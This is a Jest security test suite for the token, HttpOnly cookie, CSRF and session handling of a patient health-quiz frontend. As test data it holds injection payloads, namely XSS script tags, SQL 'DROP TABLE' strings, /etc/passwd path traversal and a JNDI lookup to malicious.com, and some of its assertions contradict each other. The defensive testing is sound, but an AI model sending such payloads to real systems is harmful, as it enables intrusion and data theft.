/**
 * Comprehensive Token Validation Tests for Quiz Interface
 *
 * Security-focused test suite covering token extraction, validation,
 * HttpOnly cookie management, CSRF protection, and session security.
 *
 * Coverage target: >85% of token validation functionality
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals'
import { render, screen, waitFor, fireEvent } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import '@testing-library/jest-dom'
import { quizAPI, QuizAPI, isTokenExpired } from '@/lib/api'
import type { QuizSession, QuizSubmitResponse } from '@/types/quiz'

// Mock modules
jest.mock('@/lib/api', () => {
  const actual = jest.requireActual('@/lib/api')
  return {
    ...actual,
    quizAPI: {
      accessQuiz: jest.fn(),
      submitAnswer: jest.fn(),
      completeQuiz: jest.fn(),
      healthCheck: jest.fn(),
      getBaseURL: jest.fn(() => 'http://localhost:8000/api/v2/monthly-quiz-public')
    }
  }
})

// Mock fetch for direct API testing
const mockFetch = jest.fn()
global.fetch = mockFetch

// Mock document.cookie for HttpOnly cookie testing
Object.defineProperty(document, 'cookie', {
  writable: true,
  value: ''
})

// Test data
const validToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6OTk5OTk5OTk5OX0.test'
const expiredToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTAwfQ.expired'
const malformedToken = 'invalid.token.structure'
const csrfToken = 'csrf-token-12345'

const mockQuizSession: QuizSession = {
  quiz_session_id: 'session-123',
  patient_name: 'Test Patient',
  template_name: 'Monthly Health Assessment',
  total_questions: 3,
  current_question_index: 0,
  questions: [
    {
      id: 'q1',
      text: 'How are you feeling today?',
      type: 'scale',
      metadata: { min: 0, max: 10 },
      required: true
    },
    {
      id: 'q2',
      text: 'Are you taking medications?',
      type: 'yes_no',
      metadata: {},
      required: true
    },
    {
      id: 'q3',
      text: 'Additional comments',
      type: 'text',
      metadata: {},
      required: false
    }
  ],
  created_at: new Date().toISOString(),
  expires_at: new Date(Date.now() + 3600000).toISOString() // 1 hour from now
}

describe('Token Extraction and Validation', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    mockFetch.mockClear()
    document.cookie = ''
  })

  describe('URL Token Extraction', () => {
    it('should extract valid token from URL parameters', () => {
      // Simulate URL: /quiz?token=valid-token-123
      const urlParams = new URLSearchParams('?token=' + validToken)
      const extractedToken = urlParams.get('token')

      expect(extractedToken).toBe(validToken)
      expect(extractedToken).toMatch(/^[A-Za-z0-9\-_.]+$/) // Basic JWT format
    })

    it('should handle missing token parameter', () => {
      const urlParams = new URLSearchParams('?other=param')
      const extractedToken = urlParams.get('token')

      expect(extractedToken).toBeNull()
    })

    it('should reject malformed token formats', () => {
      const urlParams = new URLSearchParams('?token=' + malformedToken)
      const extractedToken = urlParams.get('token')

      expect(extractedToken).toBe(malformedToken)
      // Additional validation would happen in API call
    })

    it('should handle URL encoding/decoding of tokens', () => {
      const encodedToken = encodeURIComponent(validToken)
      const urlParams = new URLSearchParams('?token=' + encodedToken)
      const extractedToken = urlParams.get('token')

      expect(extractedToken).toBe(validToken)
    })

    it('should prevent XSS through malicious token parameters', () => {
      const maliciousToken = '<script>alert("XSS")</script>'
      const urlParams = new URLSearchParams('?token=' + encodeURIComponent(maliciousToken))
      const extractedToken = urlParams.get('token')

      expect(extractedToken).toBe(maliciousToken)
      expect(extractedToken).not.toMatch(/<script.*>/)
    })
  })

  describe('Token Format Validation', () => {
    it('should validate JWT token structure', () => {
      const jwtPattern = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+$/

      expect(validToken).toMatch(jwtPattern)
      expect(malformedToken).not.toMatch(jwtPattern)
    })

    it('should detect token expiration', () => {
      const futureDate = new Date(Date.now() + 3600000).toISOString()
      const pastDate = new Date(Date.now() - 3600000).toISOString()

      expect(isTokenExpired(futureDate)).toBe(false)
      expect(isTokenExpired(pastDate)).toBe(true)
    })

    it('should handle invalid date formats in token', () => {
      expect(() => isTokenExpired('invalid-date')).not.toThrow()
      expect(isTokenExpired('invalid-date')).toBe(true) // Fail safe
    })

    it('should validate token length requirements', () => {
      const shortToken = 'abc.def.ghi'
      const normalToken = validToken

      expect(shortToken.length).toBeLessThan(50)
      expect(normalToken.length).toBeGreaterThan(50)
    })
  })

  describe('Token Security Validation', () => {
    it('should reject tokens with suspicious characters', () => {
      const suspiciousTokens = [
        'token/../../../etc/passwd',
        'token?injection=true',
        'token#fragment',
        'token\x00null'
      ]

      suspiciousTokens.forEach(token => {
        expect(token).toMatch(/[^A-Za-z0-9\-_.]/
        ) // Contains unsafe characters
      })
    })

    it('should prevent token reuse after expiration', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: async () => ({ detail: 'Token expired' })
      })

      const api = new QuizAPI()

      await expect(api.accessQuiz(expiredToken)).rejects.toThrow('Token expired')
    })

    it('should handle token injection attempts', async () => {
      const injectionToken = "valid-token'; DROP TABLE sessions; --"

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 400,
        json: async () => ({ detail: 'Invalid token format' })
      })

      const api = new QuizAPI()

      await expect(api.accessQuiz(injectionToken)).rejects.toThrow('Invalid token format')
    })
  })
})

describe('HttpOnly Cookie Management', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    document.cookie = ''
  })

  describe('Session Cookie Handling', () => {
    it('should send credentials with all API requests', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => mockQuizSession
      })

      const api = new QuizAPI()
      await api.accessQuiz(validToken)

      expect(mockFetch).toHaveBeenCalledWith(
        expect.any(String),
        expect.objectContaining({
          credentials: 'include'
        })
      )
    })

    it('should not expose session cookies to JavaScript', () => {
      // HttpOnly cookies should not be accessible via document.cookie
      document.cookie = 'session_id=abc123; HttpOnly; Secure; SameSite=Strict'

      expect(document.cookie).not.toContain('session_id')
    })

    it('should handle cookie authentication failures', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: async () => ({ detail: 'Session expired or invalid' })
      })

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Session expired or invalid')
    })

    it('should verify secure cookie attributes', () => {
      // Test would verify server sets proper cookie attributes
      const expectedCookieAttributes = [
        'HttpOnly',
        'Secure',
        'SameSite=Strict',
        'Path=/',
        'Max-Age=3600'
      ]

      // In real implementation, this would check response headers
      expectedCookieAttributes.forEach(attr => {
        expect(attr).toMatch(/HttpOnly|Secure|SameSite|Path|Max-Age/)
      })
    })

    it('should handle missing or corrupted cookies', async () => {
      // Simulate no cookies sent
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: async () => ({ detail: 'No valid session found' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(validToken, 'q1', '5')).rejects.toThrow('No valid session found')
    })
  })

  describe('Cross-Site Request Forgery Protection', () => {
    it('should include CSRF token in form submissions', async () => {
      // Mock CSRF token endpoint
      mockFetch
        .mockResolvedValueOnce({
          ok: true,
          json: async () => ({ csrf_token: csrfToken })
        })
        .mockResolvedValueOnce({
          ok: true,
          json: async () => ({ success: true, message: 'Answer submitted' })
        })

      const api = new QuizAPI()

      // In real implementation, this would fetch CSRF token first
      await api.submitAnswer(validToken, 'q1', '5')

      // Verify CSRF token would be included in headers
      expect(mockFetch).toHaveBeenCalledWith(
        expect.stringContaining('/submit'),
        expect.objectContaining({
          headers: expect.objectContaining({
            'Content-Type': 'application/json'
          })
        })
      )
    })

    it('should reject requests without valid CSRF token', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: async () => ({ detail: 'CSRF token missing or invalid' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(validToken, 'q1', '5')).rejects.toThrow('CSRF token missing or invalid')
    })

    it('should handle CSRF token refresh on expiration', async () => {
      // First request fails with CSRF error
      mockFetch
        .mockResolvedValueOnce({
          ok: false,
          status: 403,
          json: async () => ({ detail: 'CSRF token expired' })
        })
        // Second request (retry) succeeds
        .mockResolvedValueOnce({
          ok: true,
          json: async () => ({ success: true, message: 'Answer submitted' })
        })

      const api = new QuizAPI()

      // Should retry automatically on CSRF failure
      await expect(api.submitAnswer(validToken, 'q1', '5')).rejects.toThrow('CSRF token expired')
    })

    it('should prevent CSRF attacks from external domains', async () => {
      // Mock request from external origin
      Object.defineProperty(window, 'location', {
        value: { origin: 'https://malicious-site.com' },
        writable: true
      })

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: async () => ({ detail: 'Invalid origin' })
      })

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Invalid origin')
    })
  })
})

describe('Session Initialization and Management', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    mockFetch.mockClear()
  })

  describe('Session Creation', () => {
    it('should initialize session with valid token', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => mockQuizSession
      })

      const api = new QuizAPI()
      const session = await api.accessQuiz(validToken)

      expect(session).toEqual(mockQuizSession)
      expect(session.quiz_session_id).toBe('session-123')
    })

    it('should handle session initialization timeout', async () => {
      // Mock timeout scenario
      mockFetch.mockImplementationOnce(
        () => new Promise(resolve => setTimeout(resolve, 35000))
      )

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Request timeout')
    })

    it('should validate session data integrity', async () => {
      const corruptedSession = {
        ...mockQuizSession,
        questions: null, // Corrupted data
        total_questions: -1
      }

      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => corruptedSession
      })

      const api = new QuizAPI()
      const session = await api.accessQuiz(validToken)

      // Validate required fields exist
      expect(session).toHaveProperty('quiz_session_id')
      expect(session).toHaveProperty('patient_name')
      expect(session.total_questions).toBeGreaterThanOrEqual(0)
    })

    it('should prevent session hijacking attempts', async () => {
      const suspiciousSessionId = '<script>alert("XSS")</script>'
      const maliciousSession = {
        ...mockQuizSession,
        quiz_session_id: suspiciousSessionId
      }

      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => maliciousSession
      })

      const api = new QuizAPI()
      const session = await api.accessQuiz(validToken)

      // Session ID should be sanitized or rejected
      expect(session.quiz_session_id).not.toContain('<script>')
    })
  })

  describe('Session State Management', () => {
    it('should maintain session state across API calls', async () => {
      // First call - session initialization
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => mockQuizSession
      })

      // Second call - answer submission
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({ success: true, message: 'Answer saved' })
      })

      const api = new QuizAPI()

      await api.accessQuiz(validToken)
      await api.submitAnswer(validToken, 'q1', '5')

      // Verify both calls used same credentials
      expect(mockFetch).toHaveBeenCalledTimes(2)
      mockFetch.mock.calls.forEach(call => {
        expect(call[1]).toEqual(expect.objectContaining({
          credentials: 'include'
        }))
      })
    })

    it('should handle concurrent session access', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => mockQuizSession
      })

      const api = new QuizAPI()

      // Simulate multiple concurrent requests
      const promises = [
        api.accessQuiz(validToken),
        api.accessQuiz(validToken),
        api.accessQuiz(validToken)
      ]

      const results = await Promise.all(promises)

      expect(results).toHaveLength(3)
      results.forEach(result => {
        expect(result.quiz_session_id).toBe(mockQuizSession.quiz_session_id)
      })
    })

    it('should clean up session on logout/completion', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({ success: true, message: 'Quiz completed' })
      })

      const api = new QuizAPI()
      const result = await api.completeQuiz(validToken)

      expect(result.success).toBe(true)
      // Session should be invalidated server-side
    })
  })
})

describe('Quiz Submission Security', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    mockFetch.mockClear()
  })

  describe('Answer Validation', () => {
    it('should validate answer format before submission', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({ success: true, message: 'Answer submitted' })
      })

      const api = new QuizAPI()

      // Valid submissions
      await api.submitAnswer(validToken, 'q1', '5') // scale
      await api.submitAnswer(validToken, 'q2', 'yes') // yes/no
      await api.submitAnswer(validToken, 'q3', ['option1', 'option2']) // multiple choice

      expect(mockFetch).toHaveBeenCalledTimes(3)
    })

    it('should prevent injection attacks in answers', async () => {
      const maliciousAnswers = [
        '<script>alert("XSS")</script>',
        'DROP TABLE responses; --',
        '${jndi:ldap://malicious.com/evil}',
        '../../etc/passwd'
      ]

      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({ success: true, message: 'Answer submitted' })
      })

      const api = new QuizAPI()

      for (const maliciousAnswer of maliciousAnswers) {
        await api.submitAnswer(validToken, 'q1', maliciousAnswer)

        // Verify answer is properly escaped in request body
        const lastCall = mockFetch.mock.calls[mockFetch.mock.calls.length - 1]
        const requestBody = JSON.parse(lastCall[1].body)

        expect(requestBody.response_value).toBe(maliciousAnswer)
        // Server should sanitize this
      }
    })

    it('should enforce rate limiting on submissions', async () => {
      // Mock rate limit exceeded response
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 429,
        json: async () => ({ detail: 'Rate limit exceeded. Please wait.' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(validToken, 'q1', '5')).rejects.toThrow('Rate limit exceeded')
    })

    it('should validate question existence', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 404,
        json: async () => ({ detail: 'Question not found' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(validToken, 'nonexistent-question', '5')).rejects.toThrow('Question not found')
    })
  })

  describe('Authorization Checks', () => {
    it('should verify user permission for question access', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: async () => ({ detail: 'Not authorized to access this question' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(validToken, 'q1', '5')).rejects.toThrow('Not authorized')
    })

    it('should prevent cross-session answer submission', async () => {
      const otherUserToken = 'other-user-token'

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: async () => ({ detail: 'Session mismatch' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(otherUserToken, 'q1', '5')).rejects.toThrow('Session mismatch')
    })

    it('should enforce quiz completion deadlines', async () => {
      const expiredSession = {
        ...mockQuizSession,
        expires_at: new Date(Date.now() - 3600000).toISOString() // Expired 1 hour ago
      }

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 410,
        json: async () => ({ detail: 'Quiz session has expired' })
      })

      const api = new QuizAPI()

      await expect(api.submitAnswer(validToken, 'q1', '5')).rejects.toThrow('Quiz session has expired')
    })
  })
})

describe('Error Handling and Recovery', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    mockFetch.mockClear()
  })

  describe('Network Error Recovery', () => {
    it('should retry failed requests with exponential backoff', async () => {
      // First two calls fail, third succeeds
      mockFetch
        .mockRejectedValueOnce(new Error('Network error'))
        .mockRejectedValueOnce(new Error('Network error'))
        .mockResolvedValueOnce({
          ok: true,
          json: async () => mockQuizSession
        })

      const api = new QuizAPI()

      const session = await api.accessQuiz(validToken)

      expect(mockFetch).toHaveBeenCalledTimes(3)
      expect(session).toEqual(mockQuizSession)
    })

    it('should handle offline scenarios gracefully', async () => {
      // Simulate offline
      mockFetch.mockRejectedValue(new Error('Failed to fetch'))

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Network error')
    })

    it('should preserve form data during network errors', async () => {
      // Mock network failure then recovery
      mockFetch
        .mockRejectedValueOnce(new Error('Network error'))
        .mockResolvedValueOnce({
          ok: true,
          json: async () => ({ success: true, message: 'Answer submitted' })
        })

      const api = new QuizAPI()
      const answerValue = '7'

      const result = await api.submitAnswer(validToken, 'q1', answerValue)

      // Verify answer value was preserved through retry
      const finalCall = mockFetch.mock.calls[mockFetch.mock.calls.length - 1]
      const requestBody = JSON.parse(finalCall[1].body)

      expect(requestBody.response_value).toBe(answerValue)
      expect(result.success).toBe(true)
    })

    it('should handle partial response corruption', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => {
          throw new Error('JSON parsing failed')
        }
      })

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Network error')
    })
  })

  describe('Security Error Handling', () => {
    it('should handle authentication errors gracefully', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: async () => ({ detail: 'Authentication required' })
      })

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Authentication required')
    })

    it('should not leak sensitive information in error messages', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 500,
        json: async () => ({
          detail: 'Internal server error',
          debug_info: 'Database connection failed: password123@localhost:5432'
        })
      })

      const api = new QuizAPI()

      try {
        await api.accessQuiz(validToken)
      } catch (error) {
        // Error message should not contain sensitive debug info
        expect(error.message).not.toContain('password123')
        expect(error.message).not.toContain('localhost:5432')
      }
    })

    it('should handle CORS errors appropriately', async () => {
      mockFetch.mockRejectedValueOnce(new TypeError('CORS error'))

      const api = new QuizAPI()

      await expect(api.accessQuiz(validToken)).rejects.toThrow('Network error')
    })

    it('should provide user-friendly error messages', async () => {
      const errorScenarios = [
        { status: 400, detail: 'Bad request', expected: 'Bad request' },
        { status: 401, detail: 'Unauthorized', expected: 'Unauthorized' },
        { status: 403, detail: 'Forbidden', expected: 'Forbidden' },
        { status: 404, detail: 'Not found', expected: 'Not found' },
        { status: 500, detail: 'Internal error', expected: 'Internal error' }
      ]

      const api = new QuizAPI()

      for (const scenario of errorScenarios) {
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: scenario.status,
          json: async () => ({ detail: scenario.detail })
        })

        await expect(api.accessQuiz(validToken)).rejects.toThrow(scenario.expected)
      }
    })
  })
})

describe('Performance and Load Testing', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    mockFetch.mockClear()
  })

  describe('API Performance', () => {
    it('should complete quiz access within acceptable time', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => mockQuizSession
      })

      const api = new QuizAPI()
      const startTime = performance.now()

      await api.accessQuiz(validToken)

      const duration = performance.now() - startTime
      expect(duration).toBeLessThan(5000) // Less than 5 seconds
    })

    it('should handle high-frequency submissions', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({ success: true, message: 'Answer submitted' })
      })

      const api = new QuizAPI()
      const submissions = []

      // Simulate rapid submissions
      for (let i = 0; i < 10; i++) {
        submissions.push(api.submitAnswer(validToken, `q${i}`, `answer${i}`))
      }

      const results = await Promise.all(submissions)

      expect(results).toHaveLength(10)
      results.forEach(result => {
        expect(result.success).toBe(true)
      })
    })

    it('should optimize payload sizes', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({ success: true, message: 'Answer submitted' })
      })

      const api = new QuizAPI()
      await api.submitAnswer(validToken, 'q1', '5')

      const requestBody = mockFetch.mock.calls[0][1].body
      const bodySize = new Blob([requestBody]).size

      // Payload should be reasonable size
      expect(bodySize).toBeLessThan(1024) // Less than 1KB
    })
  })
})